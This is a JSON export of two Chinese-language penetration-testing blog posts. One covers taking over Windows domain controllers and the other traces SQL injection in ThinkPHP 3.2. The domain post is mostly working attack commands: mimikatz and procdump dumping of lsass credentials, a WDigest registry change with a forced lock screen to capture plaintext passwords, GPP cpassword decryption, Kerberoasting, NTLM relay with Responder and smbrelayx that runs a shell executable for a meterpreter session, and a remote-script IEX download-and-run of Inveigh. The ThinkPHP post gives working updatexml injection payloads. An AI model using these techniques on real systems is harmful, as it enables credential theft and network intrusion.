[{"title":"获取域控的方法","url":"/2020/02/26/获取域控的方法/","content":"\n#### **高权限读取本地密码**\n\n当域管理员在域成员机器上登录进行工作的时候，会将明文密码保存在本地进行的lsass.exe，可以通过mimikatz来读取到本地的明文密码。\n\n```\nprivilege::debug  # 提权\nsekurlsa::logonpasswords\n```\n\n如果主机存在杀软的时候，上传mimikatz很多时候都会被杀掉，可以通过[procdump](https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump)+mimikatz的方式进行绕过。先导出lsass.exe\n\n```\nprocdump64.exe -accepteula -ma lsass.exe lsass.dmp\n```\n\n保存到本地，通过mimikatz读lsass.dmp的明文\n\n```\nmimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\"  > 1.txt\n```\n\n如果目标机器是windows server 2012，通过添加注册表，在通过锁屏，让管理员重新登录及可以读取明文。\n\n添加注册表，设置UseLogonCredential设置为1\n\n```\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n```\n\n利用powershell脚本进行锁屏\n\n```\nFunction Lock-WorkStation \n{\n$signature = @\"\n[DllImport(\"user32.dll\", SetLastError = true)]\npublic static extern bool LockWorkStation();\n\"@\n$LockWorkStation = Add-Type -memberDefinition $signature -name \"Win32LockWorkStation\" -namespace Win32Functions -passthru\n$LockWorkStation::LockWorkStation() | Out-Null\n}\nLock-WorkStation\n```\n\n管理员重新登录后就可以抓取到明文密码了。\n\n#### **SYSVOL还原组策略**\n\n在域环境中，有个默认的共享路径\n\n```\n\\\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\\n```\n\nSYSVOL是活动目录存储文件服务副本的共享文件夹，里面包含有登录脚本，组策略数据等，域里的所有用户都能访问这个共享文件。在SYSVOL目录下，默认是没有groups.xml文件的，必须创建组策略脚本登录才有这个文件。在groups.xml文件中，密码是通过AES-256加密的，但是微软发布了AES的[私钥](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)。\n\n可以利用powershell解密密文:\n\n```powershell\nfunction Get-DecryptedCpassword {\n    [CmdletBinding()]\n    Param (\n        [string] $Cpassword\n    )\n \n    try {\n        #Append appropriate padding based on string length  \n        $Mod = ($Cpassword.length % 4)\n \n        switch ($Mod) {\n        '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}\n        '2' {$Cpassword += ('=' * (4 - $Mod))}\n        '3' {$Cpassword += ('=' * (4 - $Mod))}\n        }\n \n        $Base64Decoded = [Convert]::FromBase64String($Cpassword)\n \n        #Create a new AES .NET Crypto Object\n        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider\n        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,\n                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)\n \n        #Set IV to all nulls to prevent dynamic generation of IV value\n        $AesIV = New-Object Byte[]($AesObject.IV.Length) \n        $AesObject.IV = $AesIV\n        $AesObject.Key = $AesKey\n        $DecryptorObject = $AesObject.CreateDecryptor() \n        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)\n \n        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)\n    }\n \n    catch {Write-Error $Error[0]}\n}\nGet-DecryptedCpassword \"I0vK3Yj0SeoHQDxF5skcjt3BOkMZmX6IiqRVKCTo4Z4\"\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/1.png)\n\n针对SYSOVL的防御：\n\n```\n1.打补丁KB2962486\n2.删除SYSVOL目录下的groups.xml\n3.设置共享文件SYSVOL的权限\n```\n\n#### **Kerberoasting**\n\nSPN为服务主体名称，是服务实列(MSSQL,HTTP等)的唯一标识，如果在林中安装服务的多个实列，每个实列都有自己的SPN，如果kerberos服务票证的加密类型为RC4_HMAC_MD5，就可以导出TGS对其进行离线破解，获取到域用户的密码了。\n\n使用setspn查询spn(windows7和server2008默认自带)\n\n查询域内所有的SPN和查询test域的SPN\n\n```\nsetspn.exe -q */*\nsetspn.exe -T test.com -q */*\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/2.png)\n\n以CN开头的为代表一个账号，机器账号为Computers，域用户账号为Users\n\n查询域内注册的spn（kerberoast）\n\n```\ncscript GetUserSPNs.vbs\n```\n\nPowerView\n\nhttps://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1\n\n```\nGet-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon\n```\n\n给MSSQL服务注册SPN\n\n```\nsetspn.exe -A MSSQLSvc/WIN-M34UCFJIPNQ.test.com test.com\\fanxing\n```\n\n将kerberos的加密方式换成RC4_HMAC_MD5\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/3.png)\n\n请求指定的TGS，完成之后klist就能查看相应的票据\n\n```\n$SPNName = 'MSSQLSvc/WIN-M34UCFJIPNQ.test.com'\nAdd-Type -AssemblyNAme System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/4.png)\n\nmimikatz导出票据\n\n```\nkerberos::list /export\n```\n\n使用[tgsrepcrack.py](https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py)破解\n\n```\npython tgsrepcrack.py wordlist.txt mssql.kirbi\n```\n\n**kerberoasting后门利用**\n\n在获取到spn的修改权限后，可以给指定的域用户注册spn，可以获取到任意域用户的TGS进行离线破解\n\n```\nsetspn.exe -U -A VNC/WIN-M34UCFJIPNQ.test.com Administrator\n```\n\n#### **重放攻击**\n\n在NTML认证的过程中，数据包传递的是NTML-Hash加密的16位的challenge随机数得到的Net-NTML\n\n Hash，如果存在中间人的情况，就可以通过hash进行重放攻击，下面简述下存在中间人，NTML协议过程：\n\n![](https://p1.ssl.qhimg.com/t01f22f78b71df16680.png)\n\n```\n1.当客户端对服务端发起请求，客户端并不知道中间人存在，所以把请求发送给了中间人。中间人拿着这个请求发送给服务端，服务端以为是客户端发来的请求。\n2.进过验证后，会生成一个随机数(challenge)返回给攻击者，服务端保存的ntmlhash进行DES加密challenge(chal\nlenge1)，攻击者拿着这个challenge明文发送给客户端。\n3.客户端对这个challenge用自己的密码进行DES加密(response)，发送给中间人，中间人在将这个请求发送给服务端。\n4.服务端拿到这个response跟之前加密的challenge1进行对比，一样的话就验证成功。\n```\n\n在进行ntml中间人攻击的时候，要避免最小的网络流量，所以使用的比较多的也是LLMNR/NetNS欺骗。\n\n在两台windows进行进行资源请求的时候，对机器的解析顺序为：\n\n```\n1.HOSTS文件(c:/windows/system32/driver/etc/hosts)\n2.本地的DNS缓存(ipconfig /displaydns)\n3.dns服务器\n4.LLMNR\n5.NetBios-NS\n```\n\n##### SMB中继\n\n对于smb中继的利用条件：\n\n```\n1.不能开启smb签名，而在域内，域控上面是开启了签名的，域成员机器是没有开启的。\n2.打了ms08-068补丁的xp/2003系统也无法利用\n```\n\n首先利用nmap探测是否开启了签名\n\n```\nnmap -sT -p 445 --open --script smb-security-mode,smb-os-discovery 192.168.50.241\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/5.png)\n\n##### Responder+ntmlrelayx\n\n获取ntmlv2 hash，在攻击机执行\n\n```\npython Responder.py -I eth0 -v      #假设ip为192.168.50.64\n```\n\n在任意机器上执行\n\n```\ndir \\\\192.168.50.64\\c$\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/6.png)\n\n当使用ntmlrelayx进行重放攻击的时候，需要在Responder.conf设置SMB和HTTP服务为Off\n\n```\npython Responder.py -I eth0 -v    # 启动Responder，假设ip为192.168.50.64\npython ntlmrelayx.py -t 192.168.50.241   # -t为受害者，进行中继攻击\nnet use192.168.50.64\\c$ \"fx@123.com\" /user:\"administrator\"   # 攻击机执行\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/7.png)\n\n##### smbrelayx\n\n使用smbrelayx和ntmlrelayx都是利用的[impacket](https://github.com/CoreSecurity/impacket.git)，环境配置\n\n```\npip install pycrypto    # 安装加密库\napt-get --reinstall install python-pyasn1 python-pyasn1-modules\ncd impacket/\npython setup.py install\n```\n\n在攻击机进行重放攻击\n\n```\n# -h为指定受害者，-e在进行重放攻击后，在受害者机器执行exe\npython smbrelayx.py -h 192.168.50.241 -e /root/shell.exe \n```\n\n在内网其他目标机器执行\n\n```\nnet use192.168.50.64\\c$ \"fx@123.com\" /user:\"administrator\"\n```\n\n在msf上成功获取到meterpreter\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/8.png)\n\n##### Windows平台的重放攻击\n\n在windows下，可以利用powershell编写的[Inveigh](https://github.com/Kevin-Robertson/Inveigh)工具\n\n```\npowershell \"IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1');Invoke-Inveigh -consoleoutput Y FileOutput Y\"\n```\n\n在其他主机上执行\n\n```\ndir \\\\192.168.50.242\\c$   或者在开启HTTP，利用<img>来加载图片\n<img src=\"\\\\192.168.50.242\\1.png\">    在通过HTTP协议访问就行了\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/9.png)\n\n注意：在获取权限的那台机器，需要关闭windows防火墙，不是一直获取到challenge。","tags":["内网渗透"]},{"title":"ThinkPHP3.2 where注入分析","url":"/2020/02/26/ThinkPHP3-2-where注入分析/","content":"\n#### **where注入**\n\n在控制器中，写个demo，利用字符串方式作为where传参时存在注入\n\n```php\npublic function  getuser(){\n    $user = M('User')->where('id='.I('id'))->find();\n    dump($user);\n}\n```\n\n在变量user地方进行断点，PHPSTROM F7进入，I方法获取传入的参数\n\n```php\nswitch(strtolower($method)) {\n        case 'get'     :   \n        \t$input =& $_GET;\n        \tbreak;\n        case 'post'    :   \n        \t$input =& $_POST;\n        \tbreak;\n        case 'put'     :   \n        \tif(is_null($_PUT)){\n            \tparse_str(file_get_contents('php://input'), $_PUT);\n        \t}\n        \t$input \t=\t$_PUT;        \n        \tbreak;\n        case 'param'   :\n            switch($_SERVER['REQUEST_METHOD']) {\n                case 'POST':\n                    $input  =  $_POST;\n                    break;\n                case 'PUT':\n                \tif(is_null($_PUT)){\n                    \tparse_str(file_get_contents('php://input'), $_PUT);\n                \t}\n                \t$input \t=\t$_PUT;\n                    break;\n                default:\n                    $input  =  $_GET;\n            }\n            break;\n ......\n```\n\n重点看过滤函数\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/1.jpg)\n\n先利用htmlspecialchars函数过滤参数，在402行利用think_filter函数过滤常规sql函数\n\n```php\nfunction think_filter(&$value){\n\t// TODO 其他安全过滤\n\n\t// 过滤查询特殊字符\n    if(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value)){\n        $value .= ' ';\n    }\n}\n```\n\n在where方法中，将$where的值放入到options[\"where\"]数组中\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/2.png)\n\n继续跟进查看find方法，第748行\n\n```php\n$options     =   $this->_parseOptions($options);\n```\n\n在数组$options中增加'table'=>'tp_user'，'model'=>'User'，随后F7跟进select方法\n\n```php\npublic function select($options=array()) {\n        $this->model  =   $options['model'];\n        $this->parseBind(!empty($options['bind'])?$options['bind']:array());\n        $sql    = $this->buildSelectSql($options);\n        $result   = $this->query($sql,!empty($options['fetch_sql']) ? true : false);\n        return $result;\n}\n```\n\n跟进buildSelectSql方法，继续在跟进parseSql方法，这里可以看到生成完整的sql语句\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/3.png)\n\n这里主要查看parseWhere方法\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/4.png)\n\n跟进parseThinkWhere方法\n\n```php\nprotected function parseThinkWhere($key,$val) {\n        $whereStr   = '';\n        switch($key) {\n            case '_string':\n                // 字符串模式查询条件\n                $whereStr = $val;\n                break;\n            case '_complex':\n                // 复合查询条件\n                $whereStr = substr($this->parseWhere($val),6);\n                break;\n```\n\n$key为_string，所以$whereStr为传入的参数的值，最后parserWhere方法返回(id=1p)，所以最终payload为\n\n```\n1) and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)--+\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/5.png)\n\n#### **exp注入**\n\n漏洞demo，这里使用全局数组进行传参(不要用I方法)，漏洞才能生效\n\n```php\npublic function  getuser(){\n        $User = D('User');\n        $map = array('id' => $_GET['id']);\n        $user = $User->where($map)->find();\n        dump($user);\n}\n```\n\n直接在$user进行断点，F7跟进，跳过where方法，跟进find->select->buildSelectSql->parseSql->parseWhere\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/1.png)\n\n跟进parseWhereItem方法，此时参数$val为一个数组，{'exp','sql注入exp'}\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/2.png)\n\n此时当$exp满足exp时，将参数和值就行拼接，所以最终paylaod为\n\n```\nid[0]=exp&id[1]==1 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))--+\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/3.png)\n\n上面至于为什么不能用I方法，原因是在过滤函数think_filter中能匹配到exp字符，所以在exp字符后面加了一个空格，导致在parseWhereItem方法中无法等于exp。\n\n```php\nif(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value))\n```\n\n#### **bind注入**\n\n漏洞demo\n\n```php\npublic function  getuser(){\n        $data['id'] = I('id');\n        $uname['username'] = I('username');\n        $user = M('User')->where($data)->save($uname);\n        dump($user);\n}\n```\n\nF8跟进save方法\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/4.png)\n\n生成sql语句在update方法中\n\n```php\npublic function update($data,$options) {\n        $this->model  =   $options['model'];\n        $this->parseBind(!empty($options['bind'])?$options['bind']:array());\n        $table  =   $this->parseTable($options['table']);\n        $sql   = 'UPDATE ' . $table . $this->parseSet($data);\n        if(strpos($table,',')){// 多表更新支持JOIN操作\n            $sql .= $this->parseJoin(!empty($options['join'])?$options['join']:'');\n        }\n        $sql .= $this->parseWhere(!empty($options['where'])?$options['where']:'');\n        if(!strpos($table,',')){\n            //  单表更新支持order和lmit\n            $sql   .=  $this->parseOrder(!empty($options['order'])?$options['order']:'')\n                .$this->parseLimit(!empty($options['limit'])?$options['limit']:'');\n        }\n        $sql .=   $this->parseComment(!empty($options['comment'])?$options['comment']:'');\n        return $this->execute($sql,!empty($options['fetch_sql']) ? true : false);\n    }\n```\n\n在parseSet方法中，可以将传入的参数替换成:0\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/5.png)\n\n在bindParam方法中，$this->bind属性返回array(':0'=>参数值)\n\n```php\nprotected function bindParam($name,$value){\n        $this->bind[':'.$name]  =   $value;\n}\n```\n\n继续跟进parseWhere->parseWhereItem方法，当exp为bind时，就会在参数值前面加个冒号(:)\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/6.png)\n\n由于在sql语句中有冒号，继续跟进excute方法，这里将:0替换成了第二个参数的值\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/7.png)\n\n所以最终的payload为\n\n```\nid[0]=bind&id[1]=0 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))&username=fanxing\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/8.png)\n","tags":["代码审计"]}]